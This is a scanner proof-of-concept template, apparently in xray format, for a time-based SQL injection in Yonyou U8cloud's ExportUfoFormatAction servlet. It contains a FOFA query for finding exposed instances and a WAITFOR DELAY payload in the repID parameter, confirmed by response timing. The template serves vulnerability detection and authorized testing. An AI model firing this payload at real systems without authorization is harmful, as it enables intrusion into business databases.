id: poc-yaml-yongyou-u8cloud-exportufoformataction-sqli
info:
  name: 用友U8cloud ExportUfoFormatAction SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 用友U8cloud
  fofa: body="开启U8 cloud云端之旅"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.ExportUfoFormatAction&method=&repID=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--+
  expression: 'status_code == 200 &&

    contains(body,"iUFO") &&

    contains(body,"【操作失败】") &&

    duration > t1 &&

    duration < t2

    '
transport: http
